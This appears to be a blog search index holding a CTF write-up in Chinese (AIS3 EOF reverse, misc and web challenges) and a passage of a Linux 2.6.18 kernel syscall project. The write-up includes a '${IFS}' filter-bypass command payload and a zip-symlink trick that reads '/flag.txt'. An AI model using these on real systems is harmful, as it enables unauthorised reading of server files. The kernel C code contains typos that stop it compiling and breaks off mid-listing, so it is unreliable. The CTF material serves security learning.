<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>AIS3-EOF-2023</title>
    <link href="/2023/09/18/AIS3-EOF-2022/"/>
    <url>/2023/09/18/AIS3-EOF-2022/</url>
    
    <content type="html"><![CDATA[<h1 id="AIS3-EOF-2022"><a href="#AIS3-EOF-2022" class="headerlink" title="AIS3-EOF-2022"></a>AIS3-EOF-2022</h1><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="Mumumu"><a href="#Mumumu" class="headerlink" title="Mumumu"></a>Mumumu</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs !">linux ELF<br><br>大概看一下IDA<br>他會先讀取flag檔案，在產出一個flag_enc<br>flag為54個字<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/SteHSPV.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs !">原始flag密文<br>6ct69GHt_A00utACToohy_0u0rb_9c5byF3A&#125;G515buR11_kL&#123;3rp_<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs !">構造payload<br>0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqr<br>54個字 驗證得出來的flag_enc為<br>lYQon3OLXpWiCVmBGKHhZUMNRSaFqgADf0E2rJjPe765T8k914bcdI<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/vlIAuaG.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs !">得出打亂後的offset<br>接著寫出一個list index找出它原本的位置<br>然後將flag_enc歸位 即可拿到flag<br></code></pre></td></tr></table></figure><ul><li>exp.py<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs !">s = &quot;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqr&quot;<br>enc = &#x27;lYQon3OLXpWiCVmBGKHhZUMNRSaFqgADf0E2rJjPe765T8k914bcdI&#x27;<br>flag_enc = &#x27;6ct69GHt_A00utACToohy_0u0rb_9c5byF3A&#125;G515buR11_kL&#123;3rp_&#x27;<br><br>flag = [0] * 54<br><br>for i in range(54):<br>    flag[i] = enc.index(s[i])<br><br>result = &quot;&quot;<br><br>for i in range(54):<br>    result += flag_enc[flag[i]]    <br><br>print(result)<br><br>#FLAG&#123;Rub1k5Cub3_To_Got0uH1t0r1_t0_cyb3rp5ych05_6A96A9&#125;<br></code></pre></td></tr></table></figure><img src="https://i.imgur.com/fDcCuiD.png"></li></ul><h3 id="Nekomatsuri"><a href="#Nekomatsuri" class="headerlink" title="Nekomatsuri"></a>Nekomatsuri</h3><ul><li>DIE 先看<br><img src="https://i.imgur.com/V6w8yJg.png"></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs !">main 進來後跟著x64dbg追<br>sub_140001550(&quot;%s&quot;,Source);<br>-&gt; scanf<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/AvmioqR.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs !">sub_140001AE0解析kernel32.dll裡的函數<br>接著呼叫CreateThread<br>v6 = CreateThread(0i64, 0i64, sub_1400015F2, &amp;qword_140015040, 0, v5);<br><br>這裡使用了Windows API中的 CreateThread 函數<br>其中StartAddress function pointer，指向新執行緒中執行的函數<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/loDQMB2.png"></p><ul><li>StartAddress <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs !">disammable 發現有呼叫encrypt_rc4<br>第一個參數指向加密的記憶體pointer<br>再來第二個參數加密的大小<br>在return時會回傳大小<br><br>//key :Ch1y0d4m0m0<br></code></pre></td></tr></table></figure><img src="https://i.imgur.com/YXFbQy3.png"></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs !">main rc4解密結果為WinExec字符串<br>會再利用WriteFile寫入子線程的另一個Source裡<br><br>//WinExec<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/xCLRvuB.png"><br><img src="https://i.imgur.com/CnLQz03.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs !">再多加一個參數啟動程式讓他進入else子線程<br>Source輸入為WinExec<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/sF2tUkJ.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs !">進入check_flag<br>觀察encrypt_rc4解密後的結果<br>byte_7FF7ED6B00F6為我們要的密文65byte<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/1XUqnHN.png"><br><img src="https://i.imgur.com/JllTtZk.png"></p><ul><li><p>解密</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs !">有了flag_enc跟key<br>可以直接做解密<br><br>enc = &#x27;0525723D4F2F5701573B54213B51024D15421E51187A271A760943114311472D24507C263C772722262C7F7F0E777C37616D316F62693646353C203F396C363C50&#x27;<br>enc = bytes.fromhex(enc)<br>#print(c)<br><br>key = b&#x27;Ch1y0d4m0m0&#x27;<br><br>for i in range(len(enc)):<br>    flag = enc[i]<br>    flag = flag ^ key[i % len(key)]^i<br>    print(chr(flag), end=&#x27;&#x27;)<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/n0E5sNm.png"></p></li><li><p>FLAG</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs !">FLAG&#123;Neko_ni_muragara_re_iinkai_4264abe1c58da2caa871f102e4c4aee3&#125;<br></code></pre></td></tr></table></figure></li></ul><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="Washer"><a href="#Washer" class="headerlink" title="Washer"></a>Washer</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs !">題目打開有讀寫功能以及執行外部檔案<br>首先查看原始碼<br></code></pre></td></tr></table></figure><ul><li>chal.c<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><code class="hljs !">#include &lt;fcntl.h&gt;<br>#include &lt;grp.h&gt;<br>#include &lt;signal.h&gt;<br>#include &lt;spawn.h&gt;<br>#include &lt;stdbool.h&gt;<br>#include &lt;stdio.h&gt;<br>#include &lt;stdlib.h&gt;<br>#include &lt;string.h&gt;<br>#include &lt;unistd.h&gt;<br><br>void random_string(char *buf, int n) &#123;<br>  unsigned int seed;<br>  FILE *fp = fopen(&quot;/dev/random&quot;, &quot;r&quot;);<br>  fread(&amp;seed, sizeof(seed), 1, fp);<br>  fclose(fp);<br>  srand(seed);<br>  for (int i = 0; i &lt; n; ++i) &#123;<br>    buf[i] = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&quot;<br>        [rand() % 62];<br>  &#125;<br>  buf[n] = &#x27;\0&#x27;;<br>&#125;<br><br>void menu() &#123;<br>  puts(&quot;=== Menu ===&quot;);<br>  puts(&quot;1. Write Note&quot;);<br>  puts(&quot;2. Read Note&quot;);<br>  puts(&quot;3. Magic&quot;);<br>  puts(&quot;4. Exit&quot;);<br>&#125;<br><br>void spawn_prog(char *path) &#123;<br>  pid_t pid = 0;<br>  char *const argv[] = &#123;path, NULL&#125;;<br>  char *const envp[] = &#123;NULL&#125;;<br>  posix_spawn_file_actions_t file_actions;<br>  posix_spawn_file_actions_init(&amp;file_actions);<br>  posix_spawn_file_actions_addclose(&amp;file_actions, STDIN_FILENO);<br>  posix_spawn(&amp;pid, path, &amp;file_actions, NULL, argv, envp);<br>  sleep(1);<br>  kill(pid, SIGKILL);<br>&#125;<br><br>bool validate(char *buf) &#123;<br>  for (char *p = buf; *p != &#x27;\0&#x27;; p++) &#123;<br>    if (&#x27;$&#x27; &gt; *p || *p &gt; &#x27;&#125;&#x27;)<br>      return false;<br>  &#125;<br>  return true;<br>&#125;<br><br>int main() &#123;<br>  gid_t groups[] = &#123;65534&#125;;<br>  setgid(groups[0]);<br>  setgroups(1, groups);<br>  setuid(65534);<br>  setvbuf(stdout, NULL, _IONBF, 0);<br><br>  char name[7];<br>  random_string(name, 6);<br>  printf(&quot;Welcome, %s\n&quot;, name);<br><br>  char filename[12];<br>  sprintf(filename, &quot;/tmp/%s&quot;, name);<br>  close(<br>      open(filename, O_CREAT | O_TRUNC | O_RDWR, S_IRUSR | S_IWUSR | S_IXUSR));<br><br>  while (true) &#123;<br>    menu();<br><br>    int option;<br>    scanf(&quot;%d&quot;, &amp;option);<br>    if (option == 1) &#123;<br>      puts(&quot;Content:&quot;);<br><br>      char buf[100] = &#123;&#125;;<br>      scanf(&quot;%s&quot;, buf);<br><br>      if (validate(buf)) &#123;<br>        int fd = open(filename, O_CREAT | O_TRUNC | O_WRONLY,<br>                      S_IRUSR | S_IWUSR | S_IXUSR);<br>        write(fd, buf, strlen(buf));<br>        close(fd);<br>      &#125;<br>    &#125; else if (option == 2) &#123;<br>      char buf[100] = &#123;&#125;;<br>      int fd = open(filename, O_RDONLY);<br>      read(fd, buf, sizeof(buf));<br>      close(fd);<br><br>      printf(&quot;Content:\n%s\n&quot;, buf);<br>    &#125; else if (option == 3) &#123;<br>      puts(&quot;Curse:&quot;);<br><br>      char buf[100] = &#123;&#125;;<br>      scanf(&quot;%s&quot;, buf);<br>      spawn_prog(buf);<br>    &#125; else &#123;<br>      break;<br>    &#125;<br>  &#125;<br>  return 0;<br>&#125;<br><br></code></pre></td></tr></table></figure></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs !">題目流程大致上是先setuid為nobody<br>接著進入選單<br>會在/tmp下產生六個字元的隨機檔案<br>可以利用選單1寫入指令<br>2可以拿來查看內容<br>3可以執行外部檔案<br>因此可以透過1來寫指令 3來執行他<br><br>一開始卡住是因為我以為我沒有權限去讀flag<br>後來發現是因為我空白沒有吃進去<br>沒注意到有這段 &#x27;$&#x27; &gt; *p || *p &gt; &#x27;&#125;&#x27;<br>因此簡單用$&#123;IFS&#125;繞過<br></code></pre></td></tr></table></figure><ul><li><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs !">首先write note<br><br>cat$&#123;IFS&#125;flag<br><br>利用3 給course<br>/tmp/aMbehd<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/FnkRnQU.png"></p></li><li><p>FLAG</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs !">FLAG&#123;Hmmm_s4nitiz3r_sh0uld_h3lp_right?🤔&#125;<br></code></pre></td></tr></table></figure></li></ul><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Share"><a href="#Share" class="headerlink" title="Share"></a>Share</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs !">首先觀察題目src<br>在upload頁面可以上傳一個zip檔<br>他會用subprocess.run去做Unzip 並找到index.html redirect<br><br>如果沒有index.html他會爆出index.html not found<br><br>可以使用zip symlink攻擊手法取得/flag.txt<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs !">ln -s /flag.txt index.html<br>zip -r --symlinks demo1.zip index.html<br><br>因為index.html被我們設定軟連結至根目錄的flag.txt<br>因此當上傳後他讀取的index.html會連結至/flag.txt 取得flag<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/0gmUxAg.png"></p><ul><li>FLAG<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs !">FLAG&#123;w0W_y0U_r34L1y_kn0w_sYmL1nK!&#125;<br></code></pre></td></tr></table></figure><img src="https://i.imgur.com/npEsYXL.png"></li></ul>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux Kernel Project</title>
    <link href="/2023/08/22/Linux-Kernel-Project/"/>
    <url>/2023/08/22/Linux-Kernel-Project/</url>
    
    <content type="html"><![CDATA[<h1 id="開發環境和版本資訊"><a href="#開發環境和版本資訊" class="headerlink" title="開發環境和版本資訊"></a>開發環境和版本資訊</h1><ul><li>Virtual Machine: VirtualBox</li><li>Linux Release: Fedora 6 (32-bit)<br>— <a href="http://archive.fedoraproject.org/pub/archive/fedora/linux/core/6/i386/iso/FC-6-i386-DVD.iso">http://archive.fedoraproject.org/pub/archive/fedora/linux/core/6/i386/iso/FC-6-i386-DVD.iso</a></li><li>Kernel Version: Linux-2.6.18(32-bit)<br>— <a href="https://mirrors.edge.kernel.org/pub/linux/kernel/v2.6/linux-2.6.18.tar.gz">https://mirrors.edge.kernel.org/pub/linux/kernel/v2.6/linux-2.6.18.tar.gz</a><br>— <code>tar -zxvf linux-2.6.18.tar.gz -C /usr/src</code></li></ul><h1 id="安裝fedora-Core-6-2-6-18"><a href="#安裝fedora-Core-6-2-6-18" class="headerlink" title="安裝fedora Core 6 2.6.18"></a>安裝fedora Core 6 2.6.18</h1><p>Vmware 16 安裝不成功..<br>使用virtualbox安裝 需開啟I&#x2F;O APIC</p><ul><li>I&#x2F;O APIC VirtualBox 文檔<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs !">這是VirtualBox文檔：<br><br>啟用I / O APIC<br><br>高級可編程中斷控制器（APIC）是一種較新的x86硬件功能，近年來已取代了舊式的可編程中斷控制器（PIC）。通過I / O APIC，操作系統可以使用16個以上的中斷請求（IRQ），因此避免了IRQ共享，從而提高了可靠性。<br><br>注意注意：對於64位客戶機操作系統，尤其是Windows Vista，需要啟用I / O APIC。如果要在一台虛擬機中使用多個虛擬CPU，則也需要這樣做。<br><br>但是，對於Windows以外的某些操作系統，對I / O APIC的軟件支持一直不可靠。另外，使用I / O APIC會稍微增加虛擬化的開銷，因此會稍微降低客戶機OS的速度。<br><br>警告注意：從Windows 2000開始的所有Windows操作系統都根據I / O APIC是否可用安裝不同的內核。因此，與ACPI一樣，在安裝Windows來賓操作系統之後，不得關閉I / O APIC。但是，安裝後將其打開將無效。<br></code></pre></td></tr></table></figure></li></ul><h1 id="Kernel編譯"><a href="#Kernel編譯" class="headerlink" title="Kernel編譯"></a>Kernel編譯</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs !"># make clean<br># make mrproper<br># cp /boot/config... ./.config<br># make bzImage<br># make modules<br># make modules_install<br># make install     <br></code></pre></td></tr></table></figure><h1 id="Virtual-Memory概念"><a href="#Virtual-Memory概念" class="headerlink" title="Virtual Memory概念"></a>Virtual Memory概念</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs !">基本上每個Process都有獨立的虛擬記憶體空間，32位元機器虛擬記憶體定址為4GB，64位元機器可達到2^64 bytes。<br></code></pre></td></tr></table></figure><ul><li><p>process為OS分配系統資源(memory)的單位，thread為OS分配CPU time的單位</p></li><li><p>Process</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs !">一個elf binary檔案在 disk 上叫 user program， load進memory 開始執行後就變成 process<br>有自己的address space =&gt;code section, data section, bss section、stack、heap<br>Linux 通常把process當做是task，PCB (processing control block) 通常也稱為 struct tast_struct<br></code></pre></td></tr></table></figure></li><li><p>thread:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs !">Thread 被稱為輕量級process，它是系統調度最小單位，thread與process差別在於process有獨立的資源空間，而thread則共享process的address<br>共享process的address space =&gt; code section, data section<br>thread有自己的program counter, cpu register, stack<br>Linux 並沒有特定的data structure來標示thread or process，thread與process都使用process的PCB<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/vGHFff2.png"></p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs !">Process and task_struct<br>Linux用task_struct來描述一個process，透過task_struct-&gt;mm-&gt;mmap可以找到vm_area_struct，linux用利用VMA(virtual memory area)來描述每個segment特性，大小<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/0vOXdsL.png"></p><ul><li>mm_sturct<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs !">struct mm_struct &#123;<br>    struct vm_area_struct * mmap;        /* list of VMAs */<br>    struct rb_root mm_rb;<br>    unsigned long mmap_base;        /* base of mmap area */<br>    unsigned long task_size;        /* size of task vm space */<br>    pgd_t * pgd;<br>    atomic_t mm_count;            /* How many references to &quot;struct mm_struct&quot; (users count as 1) */<br>    int map_count;                /* number of VMAs */<br><br>    unsigned long start_code, end_code, start_data, end_data;<br>    unsigned long start_brk, brk, start_stack;<br>    unsigned long arg_start, arg_end, env_start, env_end;<br><br>    struct file *exe_file;<br><br>    /* ... some code omitted ... */<br>&#125;;<br></code></pre></td></tr></table></figure></li></ul><h1 id="編譯結果"><a href="#編譯結果" class="headerlink" title="編譯結果"></a>編譯結果</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs !">大致上的想法在kernel space的mm_struct取得segment info，<br>再回傳到user space<br><br>data、bss、code、libary segment共享記憶體<br>stack、local storage、heap segment記憶體區塊不相同<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/NV1HwVb.png"><br><img src="https://i.imgur.com/ZAJRYnH.png"></p><h1 id="程式碼"><a href="#程式碼" class="headerlink" title="程式碼"></a>程式碼</h1><ul><li><p>user space</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs !">撰寫 tmp/test.c <br>user呼叫三個線程，分別呼叫syscall 318<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><span class="hljs-type">void</span>* <span class="hljs-title function_">thread_func</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> start_code_size, start_code_start, start_code_end;<br><span class="hljs-type">int</span> ret;<br><br>ret = syscall(<span class="hljs-number">318</span>,<span class="hljs-number">1</span>);<br><br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><span class="hljs-type">int</span><br><span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br><span class="hljs-type">pthread_t</span> threadl, thread2, thread3;<br><br>pthread_create(&amp;thread1, <span class="hljs-literal">NULL</span>, thread_func, <span class="hljs-literal">NULL</span>);<br>pthread_create(&amp;thread2, <span class="hljs-literal">NULL</span>, thread_func, <span class="hljs-literal">NULL</span>);<br>pthread_create(&amp;thread3, <span class="hljs-literal">NULL</span>, thread func, <span class="hljs-literal">NULL</span>);<br><br>pthread_join(threadl, <span class="hljs-literal">NULL</span>);<br>pthread_join(thread2, <span class="hljs-literal">NULL</span>);<br>pthread_join(thread3, <span class="hljs-literal">NULL</span>) ;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>kernel space</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs !">添加syscall 318 kernel/project.c<br>利用task_struct-&gt;mm_struct-&gt;vm_area_struct結構去找所有virtual address的start,end<br>利用Printk印出每個segment的start,end<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//syscall(318)</span><br><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> _LINUX_PROJECT</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _LINUX PROJECT</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/linkage.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/kernel.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/mm.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;asm/uaccess.h&gt;</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">segment</span> <span class="hljs-title">info</span>&#123;</span><br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> start;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> end;<br><span class="hljs-type">char</span> type[<span class="hljs-number">16</span>];<br>&#125;;<br><br>asmlinkage <span class="hljs-type">long</span> <span class="hljs-title function_">sys_project</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> segment_info *info)</span>&#123;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> *<span class="hljs-title">mm</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm</span> <span class="hljs-title">area</span> <span class="hljs-keyword">struct</span> *<span class="hljs-title">vma</span>;</span><br><br>mm = &amp;current-&gt;mm;<br><span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span> (vma = mm-&gt;mmap; vma; vma= vma-&gt;vm_next)&#123;<br><br><span class="hljs-keyword">if</span> (vma-&gt;vm_flags &amp; VM_EXEC)&#123;<br>printk(<span class="hljs-string">&quot;Code segment: %lx - %lx\n&quot;</span>, vma-&gt;vm_start,vma-&gt;vm_end);<br><span class="hljs-comment">//strcpy(info[1].type, &quot;code&quot;) ;</span><br>&#125;<span class="hljs-keyword">else</span> <span 